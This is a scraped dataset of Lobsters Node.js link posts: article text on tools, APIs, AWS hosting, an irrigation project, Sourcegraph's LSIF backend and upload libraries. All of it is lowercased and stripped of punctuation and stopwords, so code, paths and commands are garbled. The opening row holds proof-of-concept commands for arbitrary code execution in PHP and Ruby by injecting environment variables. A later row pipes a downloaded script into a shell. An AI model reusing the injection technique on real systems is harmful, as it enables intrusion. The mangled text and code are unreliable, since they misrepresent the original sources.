neex used series php setting achieve arbitrary code execution orange tsai also great blog post creating exploit cve us slightly different list setting using knowledge plus knowledge gained previous nodejs technique help brendan scarvell two environment variable solution found php constraint exist technique nodejs example proof concept achieving arbitrary code execution environment variable php docker run e nautoprependfileprocselfenvironn php die id e phprcprocselfenviron php devnull autoprependfileprocselfenviron root root root ruby generic solution ruby found yet ruby accept environment variable rubyopt specify commandline option man page state rubyopt contain e k r u v w w debug disablefeature enablefeature promising option r cause ruby load library using require however limited file extension rb example somewhat useful rb file found toolsserverrb json gem available installing ruby fedora system file required web server started shown using rubyopt environment variable cause ruby process start web server docker run env binbash c dnf install ruby devnull ruby devnull surf http info webrick info ruby info webrick httpserver start sticking fedora another approach leverage fact usrbinruby actually bash script start usrbinrubymri script call bash function overwritten environment variable proof concept using exported bash function run arbitrary command docker run env bashfuncdeclare id exit binbash c dnf install ruby devnull ruby devnull root root root conclusion post explored interesting use case environment variable could assist achieving arbitrary code execution various scripting language interpreter without writing file disk hopefully enjoyed reading inspired find share improved payload scripting language find generic technique work ruby would interested hearing achieved thanks reading ciao bella
35,Lobsters,nodejs,Node.js programming,BashoJS: JavaScript Evaluator for Shell Scripts,https://bashojs.org/,bashojs javascript evaluator shell script,lazy javascript evaluator shell script basic lazy evaluation piping result quoting expression lazy evaluation exit condition shell command importing j file array map filter flatmap reduce argument reusable expression subroutine named expression seeking combining expression recursion promise logging error handling real world example document complex command document bracket basho recipe http bashojsorgrecipes http githubcombashojsbashorecipes jeswin agilehead,lazy javascript evaluator shell scriptsbasho let write complex shell task using plain javascript mix well shell command script choose best tool jobinstall basho firstif npm use npx command try basho without installingbasics basho evaluates pipeline instruction left right instruction javascript code reference external j file shell command make basho interesting lazy evaluation laterto evaluate javascript expression use option j let start single item pipeline javascript constantcopybasho j basho j true basho j option j omitted first expressionthe option p avoids printing final result sure need use thereworking string need quoting since bash chew quote need use single quote around double quotespiping result pipe expression subsequent expression variable x always used placeholder receiving previous inputcopybasho j x j expression expression space important quote following example see x quotedcopybasho j x j x expression contains bash special character necessary quote following example expression quote since bash redirection operatorcopybasho j x j x best practice wise quote expression except maybe trivially simple lazy evaluation exit condition may choose terminate pipeline option condition met since pipeline lazy expression bash command evaluatedcopybasho x j x command execute shell command e option shell command expanded j template string variable x holding input preceding command pipeline remember quote escape character hold special meaning shell etctip single quote far easier work since double quote try expand variable inside itcopybasho e echo x extend pipeline shell command shell command output becomes input next commandcopybasho j x e echo x j parseint x e echo x basho receive input via stdin always x represents inputcopyecho basho parseint x pipe multiline output commandscopyls al basho f xincludes git nothing stopping piping basho output eithercopybasho j x xargs echoimporting j file import function j file npm module import option import option take two parameter filename module name alias import import available subsequent expression throughout pipelinecopymoduleexports function square n return n basho import squarejs sqr j sqr x basho import squarejs sqr j sqr x j j sqr x array map filter flatmap reduce input expression array subsequent expression command executed item array equivalent map functioncopybasho e echo x input also object expand template stringcopybasho name jes age e echo xname xage use array objectscopybasho name kai name niki e echo xname array array surecopybasho e echo x x x command choose receive entire array optioncopybasho j xlength e echo x filter array f optioncopybasho f x e echo x reduce r option first parameter lambda second parameter initial value accumulatorcopybasho r accx e echo x also flatmap optioncopybasho flatmap used flatten array array wellbtw could also access array index template literal variable lambda shell command templatescopybasho b c e echo x argument reusable expression sometimes want pas additional argument reuse expression multiple time pipeline define expression option get stored field variable named k see usage belowhere use define option pas argumentscopybasho divisor j use reusable expressionscopybasho x j x used shell command well remember quote thoughcopybasho echocmd echo e kechocmd n x subroutine subroutine minipipelines within parent pipeline allows u define set operation could repeatedly called itemsubroutines defined sub option followed name sub sub continues till endsub found sub stored subsequent usage variable kcopybasho sub multiply x j x endsub j kmultiply x nested subroutine surecopybasho sub multiply sub square x x endsub j x j ksquare x endsub j kmultiply x named expression seeking combining expression n option give name result expression recall later seek c combine optionscopy print instead j x j n j x j option allows seek named resultcopy return basho j n j n c option allows combinemultiplex stream sequence arrayscopy return basho j n j n c g option allows recurse previous named expression take two parameter expression name predicate stop recursionhere expression keep recursing adding till exceeds print j n g x powerful instance along promise sleep specified time recursion use used periodically run command usage left reader exercisepromises j expression evaluates promise resolved passing next command pipelinecopybasho promiseresolve e echo x basho import nodefetch fetch j fetch http oaksnvgorgbashohtml e echo x logging add l option anywhere pipeline print current valuecopybasho l x j x e echo x w option thing without newlinecopybasho w x j x e echo x error handling handle error error option choose return arbitrary value place unhandled pipeline terminated immediately following example xsplit result exception second input since number split method error handler expression replaces exception string skippedcopybasho b c j xsplit error skipped first argument basho ignoreerror basho exit error simply move next itemcopybasho ignoreerror b c j xsplit printerror option work like ignoreerror print errorcopybasho printerror b c j xsplit note ignoreerror printerror must preceded option except import optionreal world example count number occurences word line textcopyecho hello world hello hello basho j xmatch hellog lengthrecursively list typescript filescopyfind basho f xendswith t count number typescript filescopyfind basho f xendswith t xlengthget weather bangalorecopyecho bangalore basho import nodefetch fetch fetch http q x appidyourapikey unitsmetric j xjson j xmaintempwho wrote harry potter philosopher stone copybasho import nodefetch fetch fetch http j xjson j xitems volumeinfoauthorsfind git hosted sub directory might need pullcopyls basho xsplit x n dirname e cd x git remote update git status f xsome branch behindtest dirnamefind git hosted sub directory need pushed remotecopyls basho xsplit x n dirname e cd x git status f xsome nothing committest xsome branch uptodatetest dirnamecheck basho version least basho v basho xsplit j parseint x parseint x parseint x ok bashoversion ok echo good format universe else echo install basho version higher fihere document complex command complex command require lot quoting make code ugly fortunately shell feature called document hugely simplifies use case pretty much avoid quoting note need specify argument separate line help readability well invoking basho remember use quote around variable see example indentation ignored use formattingcopybashocmd cat eofj hello world j xsplit eof basho bashocmd asterisk nt get substituted need substitution use eof instead eof bracket better legibility multiline command bracket help line containing opening closing bracket contain nothing else example bracket nestedcopybashocmd cat eofj x x x eof basho bashocmd basho recipe work progress see real world example http bashojsorgrecipes contribute recipe fork http githubcombashojsbashorecipes send pull requestabout basho developed jeswin sponsored agilehead software mit license freely use commercial work without restrictionsthat typing basho without parameter nothing might make happy reflective course original purpose app
36,Lobsters,nodejs,Node.js programming,danburzo/hred: reduce HTML to JSON from the command line,https://github.com/danburzo/hred,danburzohred reduce html json command line,hred h red qsx query qsx documentation installation usage concatenated json record reallife example starred repos page note security jsdom script execution disabled default related project pup xray gdom tq,hred hred html reduce commandline tool extract data html read html stdin output stdout json produced qsx query curl http danburzoro hred li href textcontent href textcontent dan burzo qsx documentation describes kind query make hred familiar cs selector mostly good go installation hred run nodejs find hred npm registry install globally npm npm install g hred install globally yarn yarn global add hred run without installing npx hred usage hred accepts qsx query string curl http enwikipediaorgwikibanana hred img alt src alt page semiprotected src alt banana cross sectionjpg src hred single modest purpose extracting part html json qsx query language lightweight extension cs selector syntax used elementqueryselectorall dom method hred offer limited reshaping resulting json via alias tool designed piped something like jq json processing necessary hred option available option description c concat result array return concatenated json record make easier collate several result together h help print help message r raw complement c return raw unquoted string result array string u url url url add base url html evaluated influence value dom property href src html attribute relative v version display current version x xml parse input xml rather html reallife example let take web page us atomic presentational cs rather semantic cs class thus make challenging extract data starred repos page extract info repository time writing curl http githubcomdanburzo tabstars hred href url textcontent title scope textcontent description let break query apart element class one hand find element nested read href html attribute url textcontent dom property title merge resulting object current scope hand find first subsequent element scope match class extract textcontent description resulting json abridged url urfavecli title n urfave clin description n n simple fast fun package building command line apps gon n note security hred us jsdom dom provider although used sole purpose parsing html querying resulting dom script execution disabled default always good idea mindful feeding untrusted html world wide web hred related project might interested pup original jq html xray concept including html attribute query string gdom qsx look bit like graphql maybe graphql dom thing tq another popular cli tool extracting data html
37,Lobsters,nodejs,Node.js programming,Kretes in 5 minutes - A full-stack TypeScript tutorial with Node.js & PostgreSQL,https://www.youtube.com/watch?v=BfcwZgPHwKk,kretes minute fullstack typescript tutorial nodejs postgresql,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature kretes minute fullstack typescript tutorial nodejs vuejs postgresql youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature kretes minute fullstack typescript tutorial nodejs vuejs postgresql youtube
38,Lobsters,nodejs,Node.js programming,Dates and Times in JavaScript – A new Temporal API from TC39,https://blogs.igalia.com/compilers/2020/06/23/dates-and-times-in-javascript/,date time javascript new temporal api,tl dr looking feedback temporal proposal try polyfill complete survey use production yet maggie pint twopart blog post fixing javascript date cookbook proposal try temporal api documentation open browser console runkit polyfill give feedback survey issue tracker temporal champion group process document,tl dr looking feedback temporal proposal try polyfill complete survey use production yet javascript date broken way fixed without breaking web story go included original javascript engine hack based javautildate deprecated due terrible api replaced better one result javascript history builtin date remained hard work directly starting year ago proposal developing add new globally available object javascript temporal temporal robust modern api working date time timestamps also make easy thing hard impossible date like converting date time zone adding subtracting accounting daylight saving time working dateonly timeonly data even handling date nongregorian calendar although temporal work default also provides finegrained optin control overflow interpreting ambiguous time corner case history proposal possible fix date read maggie pint twopart blog post fixing javascript date example power temporal check cookbook many example would difficult legacy date particularly one involving time zone would put example post code might soon become stale reason hopefully become clear proposal currently stage proposal process hoping move along stage working feature set temporal api long time believe fullfeatured api reasonable design good apis solely drawing board however time put test let javascript developer community try see whether come meet people need still early enough make drastic change api find need based feedback get please try let u know try temporal want try temporal casually interactive prompt easy visit api documentation browser documentation cookbook page open browser console temporal already loaded ready try example try runkit maybe interested bit indepth evaluation like building small test project using temporal know take people valuable project time also best way get valuable feedback really appreciate released polyfill temporal api npm use project npm install save proposaltemporal import project const temporal require proposaltemporal however use polyfill production application proposal still stage polyfill version make clear api subject change intend keep changing get feedback give feedback would love hear experience temporal tried short survey fill feel comfortable please leave u contact information since might want ask follow question please also open issue issue tracker suggestion welcome suggestion whether filled survey also browse feedback already given issue tracker give thumbsup agree thumbsdown disagree thanks participating feedback receive help u make right decision proposal move along stage temporal eventually appears browser post mean temporal champion group group delegate interested people may guess blog post hosted includes member igalia compiler team written behalf temporal champion read process document information stage mean tl dr stage time give feedback proposal still incorporated even requires drastic change stage proposal remains stable except serious problem discovered implementation browser
39,Lobsters,nodejs,Node.js programming,How many AWS services do you need to host a static webpage? (2/2),https://medium.com/warsawjs/how-many-aws-services-do-you-need-to-host-a-static-webpage-2-2-aa619fc99fc2,many aws service need host static webpage,show code awsconfigupdate region export await dynamogetitem tablename key promise updateexpression set c counter c counter counter counter returnvalues updatednew attribute,show code mentioned write lambda logic using nodejs used version runtime also choose node recentlywhat nice version use asyncawait returned response body thrown caught cause error responseconst aws require awssdk const doc require dynamodbdoc awsconfigupdate region const dynamo new docdynamodb const tablename table const key id exportsbumpcounter async event context const item counter await dynamogetitem tablename key promise return statuscode body jsonstringify await dynamoupdateitem tablename key updateexpression set c counter expressionattributenames c counter expressionattributevalues counter counter returnvalues updatednew promise attribute beginning snippet import use aws mechanism sure everything happens region choice set beginning awsconfigupdate functionwhat exported lambda async function consumes parameter event triggered lambda http request detail lambda context context eg variable defined configuring lambdathen use dynamodb client work await thanks promise method personally found expression thing updateitem confusing beginning update expression like set counter counter problematic counter reserved dynamodb keyword problem value passed like therefore used template mechanism client alias alias table column alias valueit worth setting returnvalue updatednew get response changed database column accessing attribute response give u exactly thatin case error rely cloudwatch found really helpful together plain ol consolelogto super safe come cost set number possible parallel lambda
40,Lobsters,nodejs,Node.js programming,How to build an automated DIY irrigation system controlled by an app,https://blog.usejournal.com/automated-smart-home-irrigation-system-9061c391f8e2,build automated diy irrigation system controlled app,part list hardware architecture software architecture mern stack nodejs expressjs mongo database react rest setup nodemcu video installing project raspberry pi github http githubcompatrickhallekautomatedirrigationsystemgit http getdockercom,article show build affordable automated irrigation system longer water plant hand system used house plant raised bed also plant garden larger green area number connected plant scalablehere decision irrigate made according timer rather soil moisture measured directly decision made basis whether irrigation necessary notwant read story later save journalthe system following feature controlled via web app monitor display time series data minute hour day week month levelssetting water level automatic watering triggeredsetting long pump work irrigationmanual activation irrigation buttonswitching different sensor profilesswitching dark light themepart list product link also affiliate link exactly product bought system order via link receive tiny commissionthe n amount due number pump different plant example raised bed usually sufficient one pump one sensor however different potted plant need watered separately therefor get one pump sensor potted planthardware architectureto measure soil moisture nodemcu microcontrollers read analog signal capacitive sensor filtered interpolated measured value sent local network raspberry pi decide whether trigger relay associated sensor relay opened circuit pump closed plant get wateredthe architecture chosen pump logic recording measurement data separate make possible control pump raspberry pi amount default available gpio pin also possible read analog signal capacitive sensor raspberry raspberry process digital signal surely possible read sensor serial interface requires pin setup clean used pump also separately connected power supply whose circuit controlled relay also possible use higher pumpssoftware architecturefor software architecture mern stack used software consists nodejs backend expressjs mongo database react frontend c script run nodemcu sends data rest interface backend data processed backend decided whether irrigate addition data stored mongodb frontend data also requested backend via restsetup nodemcu record measurement data sensor nodemcu must first install software order flash nodemcu microcontroller follow step described videobefore upload program set wifi password wifi name ssid ip raspberry pi host sensor name name need unique sensor name name displayed app best choose name plant sensor associated withif arduino ide successfully configured nodemcu upload program find repository nodemcuinstalling project raspberry pifirst download software raspberry pi find source code github following command downloads repository onto raspberry pi git clone http githubcompatrickhallekautomatedirrigationsystemgitcd automatedirrigationsystemto avoid install required program manually also run application docker container carry following step curl ssl http getdockercom shsudo usermod ag docker pisudo aptget install libffidev libssldevsudo aptget install aptget remove pythonconfigparsersudo install dockercomposenow pas ip address pi reactappbackendurlhttp yourraspiip environment variable dockercompose file sudo nano dockercomposeymlyou find ip command ifconfig something like save input nano editor ctr x type yes finally exit enternow everything ready start application following command sudo dockercompose upattention raspberry pi processor need adjust image mongodb dockercompose file since version image suitable type processorto run software startup execute following command systemctl start dockerservice
41,Lobsters,nodejs,Node.js programming,Evolution of the precise code intel backend,https://about.sourcegraph.com/blog/evolution-of-the-precise-code-intel-backend,evolution precise code intel backend,sourcegraphcom private instance sourcegraph sourcegraph browser extension motivation srclib srclib lsif mvp express sourcegraph extension optimizing query sqlite dgraph badgerdb change processing uploads asynchronously noderesque resque ipc pr storing crossrepository data postgresql dblink eventually reverted queue bull redis bull search within job payload text matching query queue postgresql adding graphql resolvers sourcegraphgo sourcegraphtypescript campaign code insight diagnostics introducing multiple worker container prefork sourcegraphcom headofline blocking introducing bundle manager rewriting go strangler fig optimizing code intelligence backend removing lsifserver looking forward,jumping definition symbol cursor finding reference two basic mental mechanic software engineering fast code navigation accelerates rate build mental model code available likely use hundred thousand time per day code navigation core sourcegraph help understand part universe code relevant important code navigation also present difficult technical challenge especially want provide code navigation outside ide variety application developer trying understand code webbased code search engine like sourcegraphcom private instance sourcegraph code host like github gitlab bitbucket phabricator sourcegraph browser extension order provide compileraccurate code navigation ides work lot magic behind scene involves static analysis incremental compilation build execution lot lot caching much assumes read write exec permission local filesystem sourcegraph provide precise code navigation user within millisecond without access answer language server index format lsif elsif post share technical journey lsif including chose adopt foundation precise code navigation challenge faced scaling lsifbased backend see thing going motivation journey lsif began first version sourcegraph precise code navigation firstorder concern even early version application time code navigation feature available editor certain language editor depending whether plugin added support specific language specific editor enable code navigation webbased interface eye toward enabling across language editor sourcegraph created srclib first opensource crosslanguage code analysis toolchain indexing format project like language server protocol kythe still year away released srclib worked quite well early version sourcegraph however adding srclib indexer every language turned quite undertaking many product feature demanded time attention support new language slow develop meantime language server protocol emerged new open protocol providing code navigation across many editor lsp piggybacked growing traction v code many implementation lsp emerged major language growing ecosystem sourcegraph saw opportunity take advantage also give back emerging opensource community dedicated making code intelligence ubiquitous every language contributed language server implementation go typescript javascript python java incorporated language server application architecture could deployed sourcegraph provide precise code intelligence many language able provide srclib limited developerhours language server served user well number year eventually amount code sourcegraphcom grew large organization began adopt sourcegraph big internal codebases scaling performance became issue fast forward early largest customer began regularly reporting language server outage related high usage volume large codebase size began looking way improve performance scale started thinking combine richness lsp ecosystem performance indexingbased approach like srclib february surprise delight dirk bäumer one creator lsp announced language server index format lsif code intelligence indexing format similar spirit lsp lsif lsif provides crosslanguage serialization format describes data needed quickly resolve action like gotodefinition findreferences raw lsif data json look like id type vertex label definitionresult id type edge label textdocumentdefinition outv inv id type edge label item outv invs document id type vertex label packageinformation name githubcomsourcegraphsourcegraph manager gomod version sourcegraph accepts useruploaded lsif data generated lsif indexer implementation local checkout code common scenario step repository ci pipeline sourcegraph receives data transforms internal format optimized scale query speed sourcegraph us data power local repository crossrepository code navigation action like gotodefintion findreferences today sourcegraph lsif backend multiple component handle aspect uploading parsing transforming reading writing manipulating lsif data serve user request story system grew evolved time story span commits line code mvp lsif backend began life simple express server written typescript proxied outside world endpoint sourcegraph frontend api server accepted lsif uploads wrote directly disk query request server would read lsif data current repository disk memory parse structured representation walk graph vertex edge construct appropriate response client side wrote simple sourcegraph extension query lsifserver api chose typescript express fastest way get something running given experience team primary goal solicit feedback user ergonomics upload api user would configure ci pipeline generate lsif basic user experience code navigation backed lsif performance scalability robustness code quality primary concern optimizing query serve query mvp implementation would simply read raw lsif data disk memory parse structured representation walk graph compute query result lsif index however large larger size codebase given revision larger codebases added significant latency serving user request would often also call oom crash needed make following operation fast get definition identifier given source position get reference identifier given source position get hover text identifier given source position order decided store lsif data different format optimized operation several design discussion reduced choice two option sqlite embedded filebased sql database engine dgraph distributed graph database built top lsmtreebased database badgerdb built two version backend benchmark showed upload performance sqlite dgraph backends proportional input size sqlite factor dgraph factor relatively inexperienced dgraph relatively slow performance could explained lack operational experience bad choice graph schema dgraph backend implementation found time might experimented dgraph decided go sqlite based higher initial performance familiarity using past fact would easier deploy operationally many deployment environment customer change query needed read disk document containing target source range instead lsif dump entire repository processing uploads asynchronously mvp lsif upload process synchronous acceptable mvp reading lsif data network writing directly disk adopting sqlite backend store precise code navigation added additional transformation step lsif upload process rather simply read lsif data network write directly disk parse data convert sqlite bundle increased lsif upload response time significantly began bumping timeouts enforced various client server proxy within around sourcegraph also started see frequent oom error lsifserver process larger uploads data conversion process also increased memory usage process handled uploads query uploading large file multiple small one parallel could ooming process also take code navigation query address issue decided separate work converting lsif sqlite bundle separate background process lsifserver process would continue handle uploads query uploads handler would similar mvp implementation transparently writing raw data disk rather converting synchronously lsifworker process would consume queue lsif dump process converting sqlite bundle background coordinate work lsif upload handler lsifworker process needed queue used noderesque nodejs port popular rail library resque library store job data redis already component stack also considered using postresql accessing existing postgresql instance came certain restriction due concern uptime performance sort local ipc would prevented scaling lsifserver lsifworker independently using amqp server would required introducing new major service architecture implemented splitting lsifserver lsifworker pr storing crossrepository data postgresql uploaded lsif index became single sqlite database ondisk singlerepository database would sufficient support local within repository code navigation order make code navigation experience truly seamless magical wanted support crossrepository code navigation word wanted user click reference function defined dependency arrive directly definition function source repository pretty neat enable added additional sqlite database xrepodb enabled u look repository index versioned package provided version package depended fine long one instance lsifserver lsifworker lived docker container however order support lsif across large multirepository codebases needed scale meant multiple lsifserver lsifworker instance would running different docker container perhaps different machine could longer rely share access singlewriteratatime sqlite database moved xrepodb data postgresql potential volume additional writes continued concern u lsif use grew would cause operational issue postgresql instance would affect performance unrelated part application safe kept table space lsif data disjoint prefixed table name foreign key existing table data also tried migrating lsif table second postgresql instance however required nasty trickery dblink order run migration found quite painful eventually reverted backoftheenvelope calculation suggested lsifrelated load would nt overwhelm single shared postgresql instance calculation largely held time queue bull redis saw operational issue related stuck worker lost job traced back queueing library noderesque motivated switch bull also additional feature allowed u schedule job similar spirit cron list job particular state search within job payload text matching query using redis eval command relevant pr queue postgresql adoption bull resolved issue queue implementation others remained particular problem enforcing logical transaction across data stored partially redis partially postgresql particular data could written postgresql indicating successful completion lsif bundle conversion corresponding job queue stored redis could updated within transaction sometimes got sync furthermore redis treated part sourcegraph ephemeral truncatable cache site administrator aware felt could safely wipe redis data would wreak havoc lsif processing queue address issue moved queue data redis postgresql reduced lot complexity turned custom lua script reached redis data could reduced sql query could also use postgresql transaction enforce allornothing atomicity lsifrelated update adding graphql resolvers lsifserver accessible undocumented proxy sourcegraph frontend service proxy accepted uploads served code navigation query consumer api firstparty sourcegraph extension like sourcegraphgo sourcegraphtypescript adding graphql api enabled lsif backend used part sourcegraph nascent campaign feature currently inprogress code insight also thirdparty sourcegraph extension author thirdparty api consumer functionality lsif backend continues grow recently added support diagnostics possibility user api introducing multiple worker lsifserver lsifworker still run together container easy way enable multiple worker without changing container orchestration decided prefork worker rudimentary way scale overall resource use still constrained single container isolation worker process meaning runaway memory use one starve others container worked well enough time change also helped u resolve issue lsif processing sourcegraphcom suffering headofline blocking introducing bundle manager needed enable lsifserver lsifworker instance scale horizontally time instance shared access persistent storage would store lsif data used serve query naively thought might possible simply attaching shared disk separate instance practice however issue kubernetes persistent volume default mounted readwritemany across multiple node volume plugins cephfs glusterfs nfs enable reliability performance shared access filesystems issue furthermore unsupported gcp sourcegraphcom deployed solution factor responsibility managing shared storage separate service bundle manager originally called lsifdumpmanager today known precisecodeintelbundlemanager made lsifserver lsifworker stateless freeing scale horizontally scaling bundle manager requires sharding scheme similar already used gitserver service responsible serving git data sourcegraph backend rewriting go original lsif backend written typescript easiest prototype also matched technical skillset original team time performance became consideration experience team shifted toward go particular familiar variety technique optimize program written go le wellversed technique application written typescript performance becoming firstorder consideration decided rewrite thing go initially decided adopt strangler fig model refactoring extracting first cpubound work highperformance go process would called existing worker code eventually time logic would ported go process however thing nt always go according plan knew in out typescript code simply rewrote three service go single pas resulting code nt particularly idiomatic since wanted focus bringing new system life quickly possible could sunset old one continuing refactors made code idiomatic time rewrite unlocked large number performance improvement opportunity result described optimizing code intelligence backend removing lsifserver rewriting lsif backend go lsif api server lsifserver completely stateless longer talk process bundle manager written different language taking step back realized api server process little purpose moved remained lsif api server logic server handler client used part sourcegraph external http graphql apis query lsif data dropped lsif api server looking forward journey nt stopping made significant performance improvement lsif backend continue adding feature investing optimization support massive scale lsif thing looking forward automatic zeroconfig lsif indexing repository support monorepos large repository high commit frequency creating public index opensource code connecting private code enable seamless jumping proprietary code opensource dependency keep eye update
42,Lobsters,nodejs,Node.js programming,How many AWS services do you need to host a static webpage? (1/2),https://medium.com/warsawjs/how-many-aws-services-do-you-need-to-host-a-static-webpage-1-2-b811929a9436,many aws service need host static webpage,many aws service need host static webpage dallas reedy unsplash j modification shouldhide vif shouldhide click startpage startpage sessionstoragesetitem shouldhide true xmlhttprequest const counter jsonparse reqrespresponsetext counter vm emit gotcounter counter sessionstoragesetitem counter counter const work fetch arrow function sessionstorage eu cookie law,many aws service need host static webpage photo dallas reedy unsplashthe public cloud happening periodi knew awsazuregcp service name function really wanted gain handson experience using themas probably programmer created couple webpage one member family ashamed look like still maintain recently change hosting decided use aws needed achieve wantedjs modificationsfirst thing first let start j code webpage almost static visitor counter php script using text file store number visitor increment worse html frame get around problem calculating visit refreshing pagei almost never used vue natural choice created component indexhtml main context webpagefor intro disappearing first click const intro data function return shouldhide sessionstoragegetitem shouldhide template div vif shouldhide click startpage style img src imgbgjpg style div method startpage function const vm vmshouldhide true sessionstoragesetitem shouldhide true const reqresp new xmlhttprequest reqresponreadystatechange function reqrespreadystate reqrespstatus const counter jsonparse reqrespresponsetext counter vm emit gotcounter counter sessionstoragesetitem counter counter reqrespopen get url true reqrespsend old browser supported configuring babel build script much const work fetch arrow function twhy http request see emitted event name something connected new counter mechanism come back lateralso get around multiple visit refresh problem sessionstorage localstorage answer eu cookie law seems sessionstorage require terrible cookie policy info webpage
43,Lobsters,nodejs,Node.js programming,Kicking Node into high gear for data processing or how to hire 100 cats to catch a mouse,https://sgolem.com/kicking-node-into-high-gear-for-data-processing-or-how-to-hire-100-cats-to/,kicking node high gear data processing hire cat catch mouse,callback hell promise tokio asyncstd wait something time sequential lot time promisified concurrent per thing spawn multiple thread boost processing,recently came across problem work required light processing across hundred directory initial run nt take long figured whatever could speed would pay long run anticipated need run dozen hundred time got right asked year ago exactly node event loop work say idea today happy say still nt know work least detail meantime learned good chunk rust asyncawait internals pushed right direction understanding asyncawait faster node even though singlethreaded shortest introduction asyncawait syntax imagine remember callback diabolical mess could make okay maybe u probably significant percentage nesting callback could easily produce code hard follow sometimes hard understand even rereading people call phenomenon callback hell came promise promise clean readable code even dealing async process straightforward combine promise chain sequentially process data despite people still tended nest promise logic understandable chosen one would usually last month understanding would decay logical next step rewrite period time someone idea could write async code way write sync code asyncawait born great idea dug tokio asyncstd idea worked speed something run single thread seems code mostly nothing specific wait something time sure everybody fired http request numerous time playing node read file transformed content logged wrote result file appears thing like take considerable amount time waiting o right task network connection might slow congested drive might slow dying network destination might slow far let see happens fire lot sequential network request start request waiting something getting data end request oooo ooo oo ooooooooooooooo lot nothing going request running time mean useful work waiting oooo oo oo oo ooooooooooo oooo oooo take closer look see new data processed single request time request run faster even single thread course adding thread could result much better time could slow whole thing later might realize constantly jumping one request therefore must sort overhead honest nt know much impact either way realworld task would lot waiting data decrease overhead minimum like everything else need reason use asyncawait reading file script might well use sync worry use case async might shine hundred file read network call nodejs quite limited come make super easy run thing sequentially one one time tool workload let see kind api would suitable case use promisified function keep code clean const work filepath const content await fsreadfile filepath const json jsonparse content const url jsondetailsdocumentation const re await fetch url return resbody know need done probably safe assume filepaths array matter obtained const filepaths simplest form api think const documentationpages await pareach work filepaths might also accept option object third parameter let leave later basic shell pareach function could go something like const pareach async work allargs option todo option object contain many configurables let focus number concurrent parallel worker run const batchsize option need variable see much work done know stop code inside pareach function let callwhendone let workerspawned let nextargsindex let write part actual work const spawn const args allargs nexargsindex arrayisarray args work args else work args workersspawned nextargsindex straightforward see happening spawn function get right argument check one multiple start work update variable accordingly probably noticed function let see one look const workersspawned const allargsused nextargsindex allargslength const allworkerswork workersspawned batchsize const noworkerswork workersspawned allworkerswork allargsused spawn noworkerswork allargsused callwhendone also update workersspawned variable work done checking see good time work wrap finish everything one thing left write kickstarting let batchsize spawn return new promise resolve callwhendone resolve fire worker defined batchsize variable save resolve function unblock awaiting pareach function called already published package play check pareach npm spent lot time searching name taken one mixture parallel foreach almost sound like something per thing whatever spawn multiple thread boost processing even check speedup sequential took second concurrent took second parallelized took second produced waiting random sub second timeouts firing hundred request yield similar ratio like know something like useful please clone repo try running test see much pareach version faster sequential processing
44,Lobsters,nodejs,Node.js programming,Fuzzy search your GitHub starred repositories from your terminal,https://github.com/Link-/starred_search,fuzzy search github starred repository terminal,starredsearch installation minimum requirement setup usage example output nonverbose output verbose output parsing output jq jq release history api breaking change api breaking change,starredsearch search starred repository github keyword notice project still alpha api might change without notice update reviewing changelog breaking change know repository like star abyss yes cli tool help fuzzy search search github user starred repository providing handle tool cache result locally nt risk abusing api request limit installation minimum requirement setup o x linux install npm install starredsearch g usage starredsearch user link cachedir tmpcache find recommend create alias shell avoid repeating required parameter example alias fish bash create alias temporary might want make permanent alias star starredsearch user link cachedir tmpcache use star f usage usage starredsearch option args search user starred repository github keyword option h help show message exit u user handle github handle example link c cachedir directory directory want store cache file example tmpcache f find keyword keyword want search example l limit number limit search result specified number default v verbose output debugging log v version output release version example output nonverbose output starredsearch user link find reponame repodescription overview ecmascript feature repourl http repostars reponame repodescription generate compatible feed airline bigquery rocket repourl http repostars reponame repodescription cheatsheet containing tip trick best practice code snippet repourl http repostars verbose output starredsearch user link cachedir tmpcache find verbose info searching link starred catalogue info serving search result cache reponame repodescription overview ecmascript feature repourl http repostars reponame repodescription generate compatible feed airline bigquery rocket repourl http repostars reponame repodescription cheatsheet containing tip trick best practice code snippet repourl http repostars parsing output jq pipe standard output handled tool like jq magic return first search result starredsearch u link f jq reponame repodescription overview ecmascript feature repourl http repostars return reponame every result element starredsearch u link f jq map reponame release history api breaking change change alias verbose v v add v version option added h help option added l limit option limit search result added alias documentation api breaking change add verbose flag fix output return valid json fix output return result array instead separated object
46,Lobsters,nodejs,Node.js programming,"Choose between Formidable, Busboy, Multer and Multiparty for processing file uploads",https://bytearcher.com/articles/formidable-vs-busboy-vs-multer-vs-multiparty/,choose formidable busboy multer multiparty processing file uploads,breakdown popular package formidable busboy multer multiparty formidable busboy multer multiparty use formidable multer proof concept low volume without express use formidable expressjs file memory use multer expressjs temporary file disk use multer formidable use busboy highvolume productiongrade solution visual guide,npm package reading processing multipartformdata request nodejs server design philosophy meant used expressjs standalone store intermediate file hard disk memory digging choosing one right take time guide deciding library suit best diving want decide need expressjs saving intermediate file ok want stream file saving intermediate file alright would prefer memory hard disk breakdown popular package formidable around longest released version also weekly downloads npm expressjs specific save file temporary directory hard disk busboy eventbased streaming parser tied expressjs instead storing intermediate file provides stream incoming file around since core multipartformdata implementation extracted separate dicer module multer expressjs middleware around since save intermediate file either memory hard disk populates reqfiles object consuming file finegrained control field allow file limit number uploaded file internally multer us busboy multiparty fork formidable around functionality multiparty also allows streaming file however documentation multiparty recommends using busboy faster alternative formidable busboy multer multiparty npm weekly downloads year expressjs middleware stream intermediate file disk intermediate file memory breakdown popular file upload processing library use formidable multer proof concept low volume case nt mind storing intermediate file could writing prototype going admin user handling file upload duty either way nt mind server potentially getting busted memory running hard disk filling perfectly ok case think need express whether like file memory hard disk without express use formidable want process file uploads outside expressjs got two option formidable multiparty multiparty fork formidable added stream multiparty recommends using busboy formidable user thus case something break likely get help formidable community keep mind case nt option storing file memory saving temp file disk expressjs file memory use multer use standalone library together expressjs got three option formidable multer multiparty want store file memory easy pick multer support expressjs temporary file disk use multer formidable want save file temporary directory disk got two option multer formidable good choice solid userbase want finegrained control input field allow file limit number file go multer choosing right library intermediate file use busboy highvolume productiongrade solution got highvolume situation want reliability server best option store intermediate file nodejs server instead want push file separate file server soon receive file server cloud storage service aws database support blob make happen stream optimal way handling incoming file data alternative busboy multiparty since multiparty recommends using busboy easy pick use busboy visual guide visual guide looking choice related article
